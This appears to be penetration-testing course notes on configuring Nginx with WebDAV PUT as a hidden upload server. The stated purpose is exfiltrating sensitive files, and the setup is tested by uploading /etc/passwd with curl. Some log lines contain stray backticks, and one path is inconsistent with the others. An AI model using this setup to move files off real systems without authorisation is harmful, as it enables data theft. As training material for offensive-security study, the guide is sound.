# Nginx configuration

## Installing Nginx 
````bash
sudo apt update
sudo apt install nginx
````

After installing it, you already have everything you need.

You can point your browser to your server IP address (http://localhost) or w/e IP-address you have. You should see this page:
![NGINX-Server](https://ubuntucommunity.s3.dualstack.us-east-2.amazonaws.com/original/2X/7/7504d83a9fe8c09d861b2f7c49e144ac773f0c0d.png)

## Setting up POST method

1. Create a directory to handle uploaded files.
````bash  
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
````
2. Change the owner to www-data.
````bash  
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
````
3. Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents:
````vim
server {
	listen 9001;
	
	location /SecretUploadDirectory/ {
		root	/var/www/uploads;
		dav_methods	PUT;
	}
}
````
4. Symlink our site to the sites-enabled directory.
````bash 
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
````

5. Start nginx.

````bash  
sudo systemctl restart nginx.service
````

6. If we get any error messages, be sure to check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.

````bash
tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()

ss -lnpt | grep `80`

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))

ps -ef | grep `2811`

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
````

7. We see there is already a module listening on port 80. To get around this, we can remove the default NGINX Configuration which binds on port 80.
````bash
sudo rm /etc/nginx/sites-enabled/default
````

8. Restart Nginx like in point 5
````bash  
sudo systemctl restart nginx.service
````

Now we can test upload by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt

````bash 
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
tail -1 /var/www/upload/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
````
Once we have this working, a good test is to make sure "File Listings" is not available by navigating to "http://localhost/SecretUploadDirectory". By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most of the files are sensitive by nature, and we want to do our best to hide them. Thanks to `NGINX being minimal, features like that are not enabled by default.
